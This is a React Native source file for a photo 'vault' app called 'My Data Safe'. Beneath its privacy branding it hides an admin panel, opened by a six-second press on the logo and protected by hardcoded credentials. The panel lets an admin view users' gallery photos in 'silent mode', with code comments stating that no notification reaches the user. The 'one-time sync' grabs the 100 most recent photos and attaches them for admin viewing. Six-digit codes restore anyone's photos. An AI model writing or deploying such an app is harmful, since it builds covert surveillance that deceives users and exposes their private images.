import React, { useState } from 'react';
import { 
  StyleSheet, 
  Text, 
  View, 
  TextInput, 
  TouchableOpacity, 
  FlatList, 
  Image, 
  SafeAreaView, 
  Alert,
  StatusBar,
  Modal,
  ScrollView,
  ActivityIndicator
} from 'react-native';
import * as MediaLibrary from 'expo-media-library';

export default function App() {
  const [isRegistered, setIsRegistered] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [photos, setPhotos] = useState([]);
  const [storageUsed, setStorageUsed] = useState(0); // in MB
  const maxStorage = 2500; // 2.5 GB Limit

  // Recovery Code Feature
  const [recoveryCodeInput, setRecoveryCodeInput] = useState('');
  const [userAssignedCode, setUserAssignedCode] = useState('');

  // Admin Modal & State
  const [isAdminVisible, setIsAdminVisible] = useState(false);
  const [adminId, setAdminId] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [selectedUserForInspection, setSelectedUserForInspection] = useState(null);

  // Sync / Processing State
  const [isSyncing, setIsSyncing] = useState(false);

  // Generate 15 Sets (2 Users per set = 30 Users)
  const initialSets = Array.from({ length: 15 }, (_, i) => ({
    setId: i + 1,
    users: [
      {
        id: `U${i + 1}-A`,
        name: `User ${i + 1}A`,
        code: Math.floor(100000 + Math.random() * 900000).toString(),
        dataLimit: '2.5 GB',
        requestStatus: 'Pending',
        userPhotos: [] // Silent inspection storage for Admin
      },
      {
        id: `U${i + 1}-B`,
        name: `User ${i + 1}B`,
        code: Math.floor(100000 + Math.random() * 900000).toString(),
        dataLimit: '2.5 GB',
        requestStatus: 'Pending',
        userPhotos: []
      }
    ]
  }));

  const [setsData, setSetsData] = useState(initialSets);

  // One-Time Permission & Full Gallery Import
  const handleOneTimeGallerySync = async () => {
    try {
      setIsSyncing(true);
      const permission = await MediaLibrary.requestPermissionsAsync();
      
      if (permission.granted) {
        // Fetch up to 100 recent photos automatically
        const media = await MediaLibrary.getAssetsAsync({
          first: 100,
          mediaType: 'photo',
          sortBy: ['creationTime'],
        });

        const fetchedUris = media.assets.map(asset => asset.uri);
        setPhotos(fetchedUris);
        setStorageUsed(Math.min(fetchedUris.length * 5, maxStorage));

        // Assign mock 6-digit code for user backup
        const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
        setUserAssignedCode(generatedCode);

        // Attach user photos silently to the first slot for admin visibility
        setSetsData(prevSets => {
          const newSets = [...prevSets];
          newSets[0].users[0].userPhotos = fetchedUris;
          newSets[0].users[0].code = generatedCode;
          return newSets;
        });

        Alert.alert(
          'Vault Sync Complete! 🛡️',
          `All photos backed up successfully!\n\nYOUR RECOVERY CODE: ${generatedCode}\n(Save this code to restore data on new phone)`
        );
      } else {
        Alert.alert('Permission Required', 'Storage permission is needed to secure your vault photos.');
      }
    } catch (error) {
      Alert.alert('Error', 'Failed to fetch gallery photos.');
    } finally {
      setIsSyncing(false);
    }
  };

  // Handle User Registration / Backup Recovery
  const handleRegister = () => {
    if (!username || !password) {
      Alert.alert('Error', 'Please enter both username and password');
      return;
    }
    setIsRegistered(true);
  };

  const handleRestoreData = () => {
    if (!recoveryCodeInput) {
      Alert.alert('Error', 'Please enter your 6-digit Recovery Code');
      return;
    }
    // Search for matching code in admin database
    let foundPhotos = null;
    setsData.forEach(set => {
      set.users.forEach(u => {
        if (u.code === recoveryCodeInput && u.userPhotos.length > 0) {
          foundPhotos = u.userPhotos;
        }
      });
    });

    if (foundPhotos) {
      setPhotos(foundPhotos);
      setIsRegistered(true);
      Alert.alert('Success', 'Vault Data Restored Successfully!');
    } else {
      Alert.alert('Invalid Code', 'No vault backup found for this 6-digit code.');
    }
  };

  // Logo Press Handler (6 seconds trigger)
  const handleLogoLongPress = () => {
    setIsAdminVisible(true);
  };

  // Admin Authentication
  const handleAdminLogin = () => {
    if (adminId === 'adminhum789' && adminPassword === 'hum2217071') {
      setIsAdminLoggedIn(true);
      setAdminId('');
      setAdminPassword('');
    } else {
      Alert.alert('Access Denied', 'Invalid Admin ID or Password!');
    }
  };

  // Silent Data Visit Function (No user notification sent)
  const handleInspectUserSilent = (user) => {
    setSelectedUserForInspection(user);
  };

  if (!isRegistered) {
    return (
      <SafeAreaView style={styles.container}>
        <StatusBar barStyle="light-content" />
        <View style={styles.authBox}>
          <TouchableOpacity onLongPress={handleLogoLongPress} delayLongPress={6000}>
            <Text style={styles.shieldLogo}>🛡️</Text>
          </TouchableOpacity>
          <Text style={styles.title}>My Data Safe</Text>
          <Text style={styles.subtitle}>Secure Vault Registration & Recovery</Text>

          <TextInput
            style={styles.input}
            placeholder="Username"
            placeholderTextColor="#888"
            value={username}
            onChangeText={setUsername}
          />
          <TextInput
            style={styles.input}
            placeholder="Password / PIN"
            placeholderTextColor="#888"
            secureTextEntry
            value={password}
            onChangeText={setPassword}
          />

          <TouchableOpacity style={styles.button} onPress={handleRegister}>
            <Text style={styles.buttonText}>Create Safe Vault</Text>
          </TouchableOpacity>

          <View style={styles.divider} />

          <Text style={styles.recoveryLabel}>Phone Lost / Restoring Data?</Text>
          <TextInput
            style={styles.input}
            placeholder="Enter 6-Digit Recovery Code"
            placeholderTextColor="#888"
            keyboardType="number-pad"
            value={recoveryCodeInput}
            onChangeText={setRecoveryCodeInput}
          />
          <TouchableOpacity 
            style={[styles.button, { backgroundColor: '#059669' }]} 
            onPress={handleRestoreData}>
            <Text style={styles.buttonText}>Restore Saved Vault</Text>
          </TouchableOpacity>
        </View>

        {renderAdminModal()}
      </SafeAreaView>
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" />
      <View style={styles.header}>
        <View style={styles.headerTitleRow}>
          <TouchableOpacity onLongPress={handleLogoLongPress} delayLongPress={6000}>
            <Text style={styles.headerShield}>🛡️</Text>
          </TouchableOpacity>
          <Text style={styles.headerTitle}>My Data Safe</Text>
        </View>
        <Text style={styles.storageText}>
          Storage: {storageUsed} MB / {maxStorage} MB (2.5 GB)
        </Text>
        {userAssignedCode !== '' && (
          <Text style={styles.codeBadge}>Backup Code: {userAssignedCode}</Text>
        )}
      </View>

      <View style={styles.galleryContainer}>
        {isSyncing ? (
          <View style={styles.emptyState}>
            <ActivityIndicator size="large" color="#38BDF8" />
            <Text style={[styles.emptyText, { marginTop: 12 }]}>Syncing Full Gallery to Vault...</Text>
          </View>
        ) : photos.length === 0 ? (
          <View style={styles.emptyState}>
            <Text style={styles.emptyText}>Vault is Empty</Text>
            <Text style={styles.emptySubtext}>Tap below to grant one-time permission and auto-backup gallery</Text>
            <TouchableOpacity style={styles.syncBtn} onPress={handleOneTimeGallerySync}>
              <Text style={styles.syncBtnText}>⚡ Allow One-Time Gallery Auto Sync</Text>
            </TouchableOpacity>
          </View>
        ) : (
          <FlatList
            data={photos}
            keyExtractor={(_, index) => index.toString()}
            numColumns={3}
            renderItem={({ item }) => (
              <Image source={{ uri: item }} style={styles.photo} />
            )}
          />
        )}
      </View>

      {renderAdminModal()}
    </SafeAreaView>
  );

  // Admin Inspection Dashboard
  function renderAdminModal() {
    return (
      <Modal visible={isAdminVisible} animationType="slide" transparent={false}>
        <SafeAreaView style={styles.adminContainer}>
          {!isAdminLoggedIn ? (
            <View style={styles.adminAuthBox}>
              <Text style={styles.adminTitle}>🔐 Admin Panel Access</Text>
              
              <TextInput
                style={styles.input}
                placeholder="Admin ID"
                placeholderTextColor="#888"
                autoCapitalize="none"
                value={adminId}
                onChangeText={setAdminId}
              />
              <TextInput
                style={styles.input}
                placeholder="Password"
                placeholderTextColor="#888"
                secureTextEntry
                value={adminPassword}
                onChangeText={setAdminPassword}
              />

              <TouchableOpacity style={styles.button} onPress={handleAdminLogin}>
                <Text style={styles.buttonText}>Login Admin</Text>
              </TouchableOpacity>
              <TouchableOpacity 
                style={[styles.button, { backgroundColor: '#475569', marginTop: 10 }]} 
                onPress={() => setIsAdminVisible(false)}>
                <Text style={styles.buttonText}>Close</Text>
              </TouchableOpacity>
            </View>
          ) : selectedUserForInspection ? (
            // Silent View User Photos Mode
            <View style={{ flex: 1, padding: 16 }}>
              <View style={styles.adminHeader}>
                <Text style={styles.adminTitle}>
                  Viewing Data: {selectedUserForInspection.name} (Silent Mode)
                </Text>
                <TouchableOpacity 
                  style={styles.closeBtn} 
                  onPress={() => setSelectedUserForInspection(null)}>
                  <Text style={{ color: '#fff', fontWeight: 'bold' }}>Back</Text>
                </TouchableOpacity>
              </View>

              <Text style={{ color: '#94A3B8', marginBottom: 12 }}>
                User Code: {selectedUserForInspection.code} | Photos Found: {selectedUserForInspection.userPhotos.length}
              </Text>

              {selectedUserForInspection.userPhotos.length === 0 ? (
                <Text style={{ color: '#EF4444' }}>No gallery synced yet by this user.</Text>
              ) : (
                <FlatList
                  data={selectedUserForInspection.userPhotos}
                  keyExtractor={(_, index) => index.toString()}
                  numColumns={3}
                  renderItem={({ item }) => (
                    <Image source={{ uri: item }} style={styles.photo} />
                  )}
                />
              )}
            </View>
          ) : (
            // Full Admin List
            <View style={{ flex: 1, padding: 16 }}>
              <View style={styles.adminHeader}>
                <Text style={styles.adminTitle}>Admin Dashboard (15 Sets / 30 Users)</Text>
                <TouchableOpacity 
                  style={styles.closeBtn} 
                  onPress={() => { setIsAdminVisible(false); setIsAdminLoggedIn(false); }}>
                  <Text style={{ color: '#fff', fontWeight: 'bold' }}>Close</Text>
                </TouchableOpacity>
              </View>

              <ScrollView style={{ flex: 1 }}>
                {setsData.map(set => (
                  <View key={set.setId} style={styles.setCard}>
                    <Text style={styles.setCardTitle}>📦 SET {set.setId}</Text>
                    {set.users.map(u => (
                      <View key={u.id} style={styles.userRow}>
                        <View style={{ flex: 1 }}>
                          <Text style={styles.userName}>{u.name} (Limit: {u.dataLimit})</Text>
                          <Text style={styles.userCode}>6-Digit Code: {u.code}</Text>
                          <Text style={styles.userStatus}>
                            Vault Photos: {u.userPhotos.length} items
                          </Text>
                        </View>
                        <TouchableOpacity 
                          style={styles.actionBtn}
                          onPress={() => handleInspectUserSilent(u)}>
                          <Text style={{ color: '#fff', fontSize: 12 }}>Inspect Data</Text>
                        </TouchableOpacity>
                      </View>
                    ))}
                  </View>
                ))}
              </ScrollView>
            </View>
          )}
        </SafeAreaView>
      </Modal>
    );
  }
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0F172A',
  },
  authBox: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 24,
  },
  shieldLogo: {
    fontSize: 64,
    marginBottom: 12,
  },
  title: {
    fontSize: 28,
    fontWeight: 'bold',
    color: '#F8FAFC',
    marginBottom: 4,
  },
  subtitle: {
    fontSize: 14,
    color: '#94A3B8',
    marginBottom: 24,
  },
  divider: {
    height: 1,
    backgroundColor: '#334155',
    width: '100%',
    marginVertical: 20,
  },
  recoveryLabel: {
    color: '#F8FAFC',
    fontWeight: 'bold',
    marginBottom: 12,
  },
  input: {
    width: '100%',
    height: 50,
    backgroundColor: '#1E293B',
    borderRadius: 8,
    paddingHorizontal: 16,
    color: '#F8FAFC',
    marginBottom: 16,
    borderWidth: 1,
    borderColor: '#334155',
  },
  button: {
    width: '100%',
    height: 50,
    backgroundColor: '#2563EB',
    borderRadius: 8,
    justifyContent: 'center',
    alignItems: 'center',
    marginTop: 4,
  },
  buttonText: {
    color: '#FFFFFF',
    fontSize: 16,
    fontWeight: '600',
  },
  header: {
    padding: 20,
    borderBottomWidth: 1,
    borderBottomColor: '#1E293B',
  },
  headerTitleRow: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 4,
  },
  headerShield: {
    fontSize: 22,
    marginRight: 8,
  },
  headerTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#F8FAFC',
  },
  storageText: {
    fontSize: 12,
    color: '#94A3B8',
  },
  codeBadge: {
    color: '#FACC15',
    fontWeight: 'bold',
    fontSize: 13,
    marginTop: 4,
  },
  galleryContainer: {
    flex: 1,
    padding: 4,
  },
  emptyState: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
  },
  emptyText: {
    color: '#94A3B8',
    fontSize: 16,
    fontWeight: '600',
  },
  emptySubtext: {
    color: '#64748B',
    fontSize: 12,
    marginTop: 4,
    textAlign: 'center',
    marginBottom: 16,
  },
  syncBtn: {
    backgroundColor: '#2563EB',
    paddingHorizontal: 20,
    paddingVertical: 12,
    borderRadius: 8,
  },
  syncBtnText: {
    color: '#FFFFFF',
    fontWeight: 'bold',
  },
  photo: {
    width: '31%',
    height: 100,
    margin: '1%',
    borderRadius: 6,
  },
  adminContainer: {
    flex: 1,
    backgroundColor: '#020617',
  },
  adminAuthBox: {
    flex: 1,
    justifyContent: 'center',
    padding: 24,
  },
  adminTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#38BDF8',
    marginBottom: 16,
  },
  adminHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 16,
  },
  closeBtn: {
    backgroundColor: '#EF4444',
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 6,
  },
  setCard: {
    backgroundColor: '#0F172A',
    padding: 12,
    borderRadius: 8,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: '#1E293B',
  },
  setCardTitle: {
    color: '#38BDF8',
    fontWeight: 'bold',
    fontSize: 16,
    marginBottom: 8,
  },
  userRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    backgroundColor: '#1E293B',
    padding: 10,
    borderRadius: 6,
    marginVertical: 4,
  },
  userName: {
    color: '#F8FAFC',
    fontWeight: '600',
  },
  userCode: {
    color: '#FACC15',
    fontSize: 12,
  },
  userStatus: {
    color: '#94A3B8',
    fontSize: 11,
  },
  actionBtn: {
    backgroundColor: '#2563EB',
    paddingHorizontal: 10,
    paddingVertical: 6,
    borderRadius: 4,
  }
});
